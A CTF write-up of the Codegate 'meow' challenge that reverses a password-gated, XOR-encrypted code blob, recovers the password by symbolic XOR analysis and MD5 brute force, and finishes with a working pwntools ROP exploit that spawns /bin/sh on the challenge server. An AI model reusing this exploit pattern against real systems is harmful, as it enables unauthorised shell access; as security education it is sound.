# meow (re/crypto/pwn 365)

###eng

judging by points alone, this was most difficult challenge on the ctf - probably because of unusual mix of cryptography, re and pwn.

we are given strange binary, that asks us for a password and decrypts two chunks od data with it:

```asm
lea     rdi, ahello?    ; "***** hello? *****\n>>> "
mov     eax, 0
call    _printf
mov     rdx, cs:__bss_start ; stream
lea     rax, [rbp+s]
mov     esi, 0bh        ; n
mov     rdi, rax        ; s
call    _fgets
lea     rax, [rbp+s]
mov     rdi, rax
call    check_md5
mov     [rbp+var_1c], eax
cmp     [rbp+var_1c], 1
jnz     short ok
lea     rdi, asorrybye  ; "sorry, bye!"
call    _puts
mov     edi, 0          ; status
call    _exit
; ---------------------------------------------------------------------------

ok:          
```

and `check_md5` is:

```asm
check_md5       proc near               ; code xref: main+152

var_98          = qword ptr -98h
var_90          = byte ptr -90h
s2              = byte ptr -30h
var_28          = qword ptr -28h
s1              = byte ptr -20h
var_4           = dword ptr -4

                push    rbp
                mov     rbp, rsp
                sub     rsp, 0a0h
                mov     [rbp+var_98], rdi
                mov     [rbp+var_4], 0
                mov     rax, 618f652224a9469fh
                mov     qword ptr [rbp+s2], rax
                mov     rax, 14b97d8ee7de0da8h
                mov     [rbp+var_28], rax
                lea     rax, [rbp+var_90]
                mov     rdi, rax
                call    _md5_init
                mov     rcx, [rbp+var_98]
                lea     rax, [rbp+var_90]
                mov     edx, 0ah
                mov     rsi, rcx
                mov     rdi, rax
                call    _md5_update
                lea     rdx, [rbp+var_90]
                lea     rax, [rbp+s1]
                mov     rsi, rdx
                mov     rdi, rax
                call    _md5_final
                lea     rcx, [rbp+s2]
                lea     rax, [rbp+s1]
                mov     edx, 10h        ; n
                mov     rsi, rcx        ; s2
                mov     rdi, rax        ; s1
                call    _strncmp
                test    eax, eax
                jz      short loc_1460
                mov     eax, 1
                jmp     short locret_1465
; ---------------------------------------------------------------------------

loc_1460:                               ; code xref: check_md5+92
                mov     eax, 0

locret_1465:                            ; code xref: check_md5+99
                leave
                retn
check_md5       endp
```

so this binary is computing md5 hash of our input, and compares it to hardcoded value. of course we expected that this md5 will be easily crackable, or at least in some online database.
this turned out not to be the case - it was impossible to crack this hash (at least with our budget, we're not nsa). even though the password has only 10 characters, so it's not very strong.

so we looked further - what does this program do with our password later?

this is more readable in c:

```c
  decrypt(&first_chunk, &our_password, first_len);
  decrypt(&second_chunk, &our_password, second_len);
  qmemcpy_(&blob_1, v17, first_len, &first_chunk);
  qmemcpy_(&blob_2, v16, second_len, &second_chunk);
```

and later, main function of program:

```c
__int64 sub_c45()
{
  int v1; // [sp+ch] [bp-4h]@1

  v1 = 1;
  puts("- what kind of pet would you like to have?\n- select the number of pet!");
  printf("1. angelfish\n2. bear\n3. cat\n4. dog\n5. i don't want pets\n# number = ");
  __isoc99_fscanf(_bss_start, "%1d", &v1);
  if ( v1 <= 0 || v1 > 5 )
  {
    puts("*** bad number ***");
    exit(0);
  }
  switch ( v1 )
  {
    case 1:
      sub_c00();
      break;
    case 2:
      sub_c17();
      break;
    case 3:
      blob_1();  // <- here
      break;
    case 4:
      sub_c2e();
      break;
    case 5:
      exit(0);
      break;
  }
  return 0ll;
}
```

so this program decrypts code with our password, and executes it!

this gives us some possiblities, but not much - for example, we can guess prologue and epilogue of function.

now let's look at encryption. we reimplemented it in python as follows:

```python
def decrypt_chunks(data, passw, k, sd, s0, st):
    """
    encrypt chunks with size k
    start with [s0 bytes from front] [k-s0 bytes from back]
    start with s=s0
    after every round add sd to s
    when s == st, change s to s0 again
    """
    buff = [0] * 16
    split = s0
    of = 0
    ob = len(data)
    for i in range(len(data) / k):
        for j in range(split):
            buff[j] = data[j + of]
        for j in range(k - split):
            buff[j + split] = data[split + ob - k + j]
        for j in range(k):
            buff[j] ^= passw[j]
        for j in range(split):
            data[j + of] = buff[j + k - split]
        for j in range(k - split):
            data[split + ob - k + j] = buff[j]
        of += split
        ob -= k - split
        if split == st:
            split = s0
        else:
            split += sd


def decrypt(data, passw):
    pass1 = [passw[2*i+1] for i in range(5)]

    decrypt_chunks(data, passw, 7, 2, 3, 7)
    decrypt_chunks(data, pass1, 5, -1, 5, 1)
    decrypt_chunks(data, passw, 10, 1, 4, 8)
    decrypt_chunks(data, passw, 10, 1, 4, 8)
```

and encryption, because it's easy to guess knowing how to decrypt:

```python
def encrypt_chunks(data, passw, k, sd, s0, st):
    """
    encrypt chunks with size k
    start with [s0 bytes from front] [k-s0 bytes from back]
    start with s=s0
    after every round add sd to s
    when s == st, change s to s0 again
    """
    buff = [0] * 16
    split = s0
    of = 0
    ob = len(data)
    for i in range(len(data) / k):
        for j in range(split):
            buff[j + k - split] = data[j + of]
        for j in range(k - split):
            buff[j] = data[split + ob - k + j]
        for j in range(k):
            buff[j] ^= passw[j]
        for j in range(split):
            data[j + of] = buff[j]
        for j in range(k - split):
            data[split + ob - k + j] = buff[j + split]
        of += split
        ob -= k - split
        if split == st:
            split = s0
        else:
            split += sd

def encrypt(data, passw):
    pass1 = [passw[2*i+1] for i in range(5)]

    encrypt_chunks(data, passw, 10, 1, 4, 8)
    encrypt_chunks(data, passw, 10, 1, 4, 8)
    encrypt_chunks(data, pass1, 5, -1, 5, 1)
    encrypt_chunks(data, passw, 7, 2, 3, 7)
```

and that's basically all we know. we also have encrypted blobs:


```python
data0 = """
f1 64 72 4a 4f 48 4d ba  77 73 1d 34 f5 af b8 0f
24 56 11 65 47 a3 2f 73  a4 56 4f 70 4a 13 57 9c
3f 6f 06 61 40 90 af 39  10 29 34 c3 00 7a 40 3d
4e 3f 0e 2a 2f 20 7f 73  89 7d 4b 1d 09 aa d0 00
21 89 4d 2a 67 7c 18 3b  39 f2 8d 1c a7 71 57 2e
31 14 67 48 3c 7d af 70  ae 10 31 68 d1 26 05 c8
25 f2 62 f5 5d 38 34 f2  20 0e 7e 9f fb 57 72 26
57 67 15 10 15 13 b9 3e  79 89 5d 24 12 01 98 7b
18 25 e0 df 7c 24 1b 2d  44 b0 10 3d 57 3d 62 b4
21 1d 3e d1 10 d7 45 74  96 2b 6d 3b ed 10 00 67
31 df 6c b8 86 1a 7c 6b  64 78 c6 37 76 e6 61 a0
ad be 4c ba a7 0d
""".replace('\n', '').replace(' ', '').decode('hex')

data1 = """
08 4f fe ab 4e aa b4 03  4d 99 6e a1 48 d0 7d a2
e0 49 38 61 2d bc 5e 2c  5d 62 3f 89 c6 b8 5c 5a
4b 13 41 07 df bf c2 29  07 64 14 25 32 00 73 69
2d 58 4b 76 15 29 2f a1  00 00 00 00 00 00 00 00
""".replace('\n', '').replace(' ', '').decode('hex')
```

that's the end of `re` part (not very easy, but manageable), now comes `crypto`.

how can we decrypt the code, and second blob? well, if we look at the "encrypt" function, it's just a lot of xors with password characters, and permuting order. what exactly is xored? maybe it's possible to reverse it easily?

let's check. i used our symbolicxor class (it's very useful in situations like this)

```python
class symbolicxor:
    def __init__(self, ops, const=0):
        if isinstance(ops, str):
            ops = [ops]
        self.ops = sorted(ops)
        self.const = const

    def __xor__(self, other):
        if isinstance(other, int):
            return symbolicxor(self.ops, self.const ^ other)
        elif isinstance(other, symbolicxor):
            return symbolicxor(self.setxor(self.ops, other.ops), self.const ^ other.const)

    __rxor__ = __xor__

    def setxor(self, a, b):
        out = list(a)
        for el in b:
            if el in out:
                out.remove(el)
            else:
                out.append(el)
        return out

    def __str__(self):
        if self.const == 0 and not self.ops:
            return '0'
        return '^'.join(str(c) for c in self.ops + ([self.const] if self.const else []))

    __repr__ = __str__

    def __eq__(self, oth):
        return self.ops == oth.ops and self.const == oth.const
```

and:
```python
def make_sympad(syms):
    passw = [symbolicxor('v'+str(i)) for i in range(16)]
    pad = map(ord, '\0' * syms)
    decrypt(pad, passw)
    return pad

def permute(data):
    perm = map(ord, data)
    decrypt(perm, [0]*16)
    return ''.join(map(chr, perm))

def transform(data, maps):
    # pad - encrypted and permutted zeroes - so plain 'one time pad' generated from password
    pad = make_sympad(len(data))

    # perm - permutation of encrypted data, so they are in original order
    perm = permute(data)

    out = ''
    for i in range(len(data)):
        a = pad[i]
        #print perm[i].encode('hex'),
        for con, sym in maps:
            if sym == a:
                #print chr(ord(perm[i]) ^ con).encode('hex'), a
                #print chr(ord(perm[i]) ^ con), a
                c = chr(ord(perm[i]) ^ con)
                if c not in string.printable:
                    return none
                out += c
                break
        else:
            #print '?', a
            out += '?'
    return out
```

this allowed me to show all constraints, or rather answer the question `"what is this byte xored with"`

```
00 ? v2^v5
aa ? v2^v3
48 ? v1^v8
d0 ? v3^v9
b4 ? v0^v3^v5^v9
00 ? v1^v3^v5^v6
00 ? v2^v5^v6^v7
4d ? v0^v3^v7^v8
00 ? v3^v4
5d ? v4^v8
62 ? v2^v3^v5^v9
a1 ? v0^v3^v5^v6
4f o 0
fe ? v8^v9
4e ? v1^v3^v7^v9
29 ? v3^v5
00 ? v4^v5^v7
13 ? v0^v5^v7^v8
89 ? v1^v4^v6^v9
a1 ? v0^v1^v4^v7
00 ? v1^v3^v5^v8
00 ? v2^v5^v6^v9
38 ? v0^v2^v4^v9
5a ? v1^v3^v5^v7
4b ? v2^v4^v6^v9
41 ? v1^v5^v7^v9
b8 ? v1^v8
32 ? v3^v6^v7^v9
2c ? v7^v8
61 a 0
76 ? v2^v5
07 ? v2^v3
25 ? v4^v5^v8^v9
29 ? v1^v5^v9
df ? v3^v9
73 ? v3^v5
69 ? v5^v6
c2 ? v0^v7
07 ? v0^v2^v6
64 ? v1^v3^v7
14 ? v2^v4^v8
bf ? v1^v3^v4^v9
58 ? v0^v1
4b ? v1^v3
3f ? v0^v2^v3^v5
2d ? v1^v7
2d ? v0^v2^v3^v7
bc ? v1^v3^v4^v9
15 ? v2^v3
08 ? v4^v9
2f ? v1^v3^v5^v9
c6 ? v2^v3^v5^v6
5c ? v0^v3^v5^v7
5e ? v0^v1^v4^v5
7d } 0
a2 ? v0^v2^v3^v7
e0 ? v1^v3^v5^v8
49 ? v2^v4^v7^v9
ab ? v5^v6
99 ? v1^v7
6e ? v3^v8
03 ? v1^v3^v4^v9
00 ? v0^v1
00 ? v1^v3
```

first column: value in ciphertext
second column: plaintext byte, if known (known only if we're xoring with zero, of course)
third column: password chars we're xoring with (v0 = first char, v1 = second char, etc)

ok, it's something but not enough. in fact, this was very misleading, because we thought that this second encrypted blob is flag, or at least plaintext (all known bytes are printable)! this turned out not to be the case, and i wasted a lot of time, unfortunatelly.

but to the point, i think word of explaination is due (i skipped a lot of things). what does this even do:

```python
def make_sympad(syms):
    passw = [symbolicxor('v'+str(i)) for i in range(16)]
    pad = map(ord, '\0' * syms)
    decrypt(pad, passw)
    return pad

def permute(data):
    perm = map(ord, data)
    decrypt(perm, [0]*16)
    return ''.join(map(chr, perm))

def transform(data, maps):
    # pad - encrypted and permutted zeroes - so plain 'one time pad' generated from password
    pad = make_sympad(len(data))

    # perm - permutation of encrypted data, so they are in original order
    perm = permute(data)
```

so, i knew that everything is just xoring - so in theory if i'll encrypt zeroes, i'll know exactly what gets xored with what (because of symbolicxor class). but there is small problem, order of characters in ciphertext is permuted, so i had to create `permute` function that reverses that permutation (i know, not the best name).

going back to our ciphertexts - i discovered that if we decrypt both ciphertexts, they both have the same start and similar end. and because we know that first ciphertext is code, that means that second ct must be too.

what can we do with this knowledge? a lot!. 

we assumed most standard prologue and epilogue, and came out with something like this (excuse non-standard notation) - for fragments that was the same in both ciphertexts:

```
    ((0x55 ^ 0x0d), symbolicxor(['v5', 'v2'])),  # push rbp
    ((0x48 ^ 0x48), symbolicxor(['v2', 'v3'])),  # mov rbp, rsp
    ((0x89 ^ 0xf5), symbolicxor(['v1', 'v8'])),  
    ((0xe5 ^ 0xaf), symbolicxor(['v3', 'v9'])),
    ((0x48 ^ 0x4d), symbolicxor(['v0', 'v3', 'v5', 'v9'])),  # lea rdi [stuff]
    ((0xa7 ^ 0xc3), symbolicxor(['v1', 'v3'])), # ret at the end
```

this list means for example that `v5 ^ v2 == 0x55 ^ 0x0d`. so what? well, by itself it's useless, but remember that we know md5 of whole password! so now we can intelligently bruteforce everything:

```python
import hashlib
import string

charset = string.printable
sought = '9f46a92422658f61a80ddee78e7db914'.decode('hex')

for o1 in map(ord, charset):
    o3 = o1 ^ (0xa7 ^ 0xc3)
    o8 = o1 ^ (0x89 ^ 0xf5)
    o2 = o3 ^ (0x48 ^ 0x48)
    o5 = o2 ^ (0x55 ^ 0x0d)
    o9 = o3 ^ (0xe5 ^ 0xaf)
    o0 = o3 ^ o5 ^ o9 ^ (0x48 ^ 0x4d)
    
    v0 = chr(o0)
    v1 = chr(o1)
    v2 = chr(o2)
    v3 = chr(o3)
    v5 = chr(o5)
    v8 = chr(o8)
    v9 = chr(o9)

    for v4 in charset:
        for v6 in charset:
            for v7 in charset:
                passw = v0 + v1 + v2 + v3 + v4 + v5 + v6 + v7 + v8 + v9
                if hashlib.md5(passw).digest() == sought:
                    print passw
```

and... it worked!

```
$ ./brute
$w337k!++y
```

awesome, let's use it and get the flag:

```
╰─$ ./meow.exe
***** hello? *****
>>> $w337k!++y
- what kind of pet would you like to have?
- select the number of pet!
1. angelfish
2. bear
3. cat
4. dog
5. i don't want pets
# number = 3
did you choose a cat?????
what type of cat would you prefer? '0'
>>>0
fish: “./meow.exe” terminated by signal sigsegv (address boundary error)
```

wait, what? wtf codegate, where is my flag? let's reverse what happened. this is decrypted function that gets called:

```asm
sub_7fff3a41cc70 proc near

var_60= qword ptr -60h
var_58= qword ptr -58h
var_50= qword ptr -50h
var_48= qword ptr -48h
var_40= qword ptr -40h
var_38= qword ptr -38h
var_30= qword ptr -30h
var_28= qword ptr -28h
var_20= dword ptr -20h
var_1c= byte ptr -1ch

push    rbp
mov     rbp, rsp
sub     rsp, 60h
mov     rax, 20756f7920646944h
mov     [rbp+var_60], rax
mov     rax, 612065736f6f6863h
mov     [rbp+var_58], rax
mov     rax, 3f3f3f3f74616320h
mov     [rbp+var_50], rax
mov     rax, 7420746168570a3fh
mov     [rbp+var_48], rax
mov     rax, 6320666f20657079h
mov     [rbp+var_40], rax
mov     rax, 646c756f77207461h
mov     [rbp+var_38], rax
mov     rax, 65727020756f7920h
mov     [rbp+var_30], rax
mov     rax, 273027203f726566h
mov     [rbp+var_28], rax
mov     [rbp+var_20], 3e3e3e0ah
mov     [rbp+var_1c], 0
lea     rax, [rbp+var_60]
mov     edx, 44h
mov     rsi, rax
mov     edi, 1
mov     eax, 1
syscall
lea     rax, [rbp+8]
mov     edx, 18h
mov     rsi, rax
mov     edi, 0
mov     eax, 0
syscall
nop
leave
retn
sub_7fff3a41cc70 endp
```

see it yet? yes, this code reads 18 bytes **on the stack, overwriting the return address**. yeah, we're in pwn challenge now.

but this won't stop us. fortunatelly, exploit turned out to be easier than i thought, because second ciphertext was clearly meant to help us:

```asm
sub_7fff3a41cc30 proc near

var_8= qword ptr -8

push    rbp
mov     rbp, rsp
sub     rsp, 10h
mov     [rbp+var_8], rdi
mov     rax, [rbp+var_8]
mov     edx, 0
mov     esi, 0
mov     rdi, rax
mov     eax, 3bh
syscall
nop
leave
retn
sub_7fff3a41cc30 endp

; ---------------------------------------------------------------------------
db    0
db    0
abinsh db '/bin/sh',0
db    0
db    0
db    0
db    0
db    0

; =============== s u b r o u t i n e =======================================


sub_7fff3a41cc66 proc near
pop     rdi
retn
```

additionally this code was loaded at constant offset in memory, so this should be easy as pwn 100 in high-school ctf.

our rop chain will look like this:

```
[pop rdi gadget]
"/bin/sh"
[shellcode]
```

so we'll pop "/bin/sh" to edi, and execute execve systall with it.

easy enough wth pwnlib!

```python
from pwn import *

r = remote('110.10.212.139', 50410)

print r.recv()

r.send('$w337k!++y\n')

print r.recv()
print r.recv()

r.send('3\n')

print r.recv()

import struct

ra = struct.pack('<q', 0x14000)
gadget = struct.pack('<q', 0x014036)
shell = struct.pack('<q', 0x14029)

cat = gadget + shell + ra

print cat.encode('hex')

r.send(cat)

r.interactive()
```

annd... it worked, and gave us flag (finally!):

```
$ cat fflag
flag{what a lovely kitty!}
```
